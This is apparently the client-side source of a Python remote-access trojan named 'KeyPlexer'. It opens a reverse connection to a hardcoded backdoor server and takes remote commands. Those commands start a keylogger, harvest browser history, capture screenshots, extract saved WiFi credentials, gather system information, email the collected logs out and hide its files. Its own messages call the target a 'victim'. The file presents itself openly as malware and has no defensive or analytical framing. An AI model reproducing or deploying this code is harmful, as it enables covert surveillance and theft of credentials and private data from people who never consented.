#!/usr/bin/python

from modules.keylogging import *
from modules.Settings import *
from modules.check_connection import *
from modules.get_history import *
from modules.find_ip import *
from modules.paths import *
from modules.menu import *
from modules.screenshots import *
from modules.wifi import *
from modules.system_info import *
from modules.hide_files import *
import socket 


"""This is reverse shell that connects
   to the backdoor server
   and keyloggs as well"""

"""
Name: KP
Date : @2017
Version : v2.2
 _  __             ____   _                        
| |/ / ___  _   _ |  _ \ | |  ___ __  __ ___  _ __ 
| ' / / _ \| | | || |_) || | / _ \\ \/ // _ \| '__|
| . \|  __/| |_| ||  __/ | ||  __/ >  <|  __/| |   
|_|\_\\___| \__, ||_|    |_| \___|/_/\_\\___||_|   
            |___/
            
          ooo,    .---.
         o`  o   /    |\________________
        o`   'oooo()  | ________   _   _)
        `oo   o` \    |/        | | | |
          `ooo'   `---'         "-" |_|
"""


host = '10.0.0.54'
#host = '147.9.115.227'
#host = '147.9.25.152'
port = 443


def connect_client_side():

                global host, port

                #threading.Timer(2,connect_client_side).start()
                
                # create a socket object
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                # connect to sock
                sock.connect((host, port))

                while True:

                    # wait for the server for more commands
                    user_command = sock.recv(4024)
                    
                    # if the server sends ":kill" command, stop the shell
                    if user_command.strip() == ':kill':
                        sock.send("Connection is shutting down ..................\n\n")
                        sock.close()
                        break
                         
                    # start logging using Keylog command
                    elif user_command.strip() == 'keylog':
                        sock.send("[*] Keylogging is on ........\n\n")
                        begin_logging()
                        sock.send("\n\n\n")

                    # get open windows
                    elif user_command.strip() == 'openwins':
                        sock.send("[*] Getting all the open programs \n\n")
                        get_all_open_windows()
                        sock.send("\n\n\n")

                    # get users IP
                    elif user_command.strip() == 'IP':
                        sock.send("[*] Getting the external IP \n\n")
                        sock.send(get_ip())
                        sock.send("\n\n\n")

                    # get browser history #CPU run wild !!! needs fixing
                    elif user_command.strip() == 'History':
                         sock.send("[*] Gathering browser history\n\n")
                         get_all_history()
                         sock.send("[*] History is saved on the victim machine. type send to get it by email\n\n")
                         sock.send("\n\n\n")


                    # send the logs via email
                    elif user_command.strip() == 'sendlogs':
                         sock.send("[*] Starting to send the logs............................ \n\n")
                         send_new_email(folder_path)
                         sock.send("[*] Check the mail for the logs..........................\n")
                         sock.send("\n\n")

                    # capture screenshots
                    elif user_command.strip() == 'capture':
                         sock.send("[*] Start capturing the images............................ \n\n")
                         capture_screenshots(screen_shots)
                         sock.send("\n\n")


                    # get wifi
                    elif user_command.strip() == 'wifi':
                        
                        sock.send("\n\n")
                        sock.send("[*] Gathering Wifi infos..................................... \n\n")
                        get_wifi_credentials()
                        #sock.send("\n\n")

                    elif user_command.strip()== 'systeminfo':
                        sock.send("\n\n")
                        sock.send("[*] Gathering System Information..................................... \n\n")
                        sock.send(get_system_info())

                    elif user_command.strip() == 'cover':
                        sock.send("\n\n")
                        sock.send("[*] Getting ready to hide and cover .................................... \n\n")
                        hide_file(folder_path)
                        
                    else:
                        sock.send("\n [*] ERROR: Entered Wrong Command. Type [Menu] to get the list of commands\n\n")  


connect_client_side()

##def shell():
##
##    threading.Timer(6,get_current_connection).start()  
##    # check the connection
##    conn = get_current_connection()
##    
##    if conn == True :  
##         connect_client_side()
##    else:
##         begin_logging()
##    
##         
##
##def main():
##
##    # start the shell
##    shell()
##    
##
##
##if __name__ == "__main__" :
##
##        main()
##


